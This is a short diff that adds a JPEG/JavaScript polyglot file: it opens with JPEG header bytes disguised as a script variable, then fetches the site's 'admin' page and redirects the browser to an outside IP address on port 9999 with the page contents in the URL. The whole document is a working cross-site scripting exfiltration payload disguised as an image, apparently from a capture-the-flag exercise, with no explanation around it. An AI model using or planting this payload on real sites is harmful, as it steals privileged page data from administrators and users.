@@ -1,0 +1,14 @@
+ÿØÿÛ='';
+
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange= function() {
+    if (this.readyState == 4 && this.status == 200) {
+    document.location = "http://86.125.27.152:9999/index.html?content=" + encodeURI(this.responseText);
+    }
+  };
+  xhttp.open("GET", "admin", true);
+  xhttp.send();
+}
+
+loadDoc();
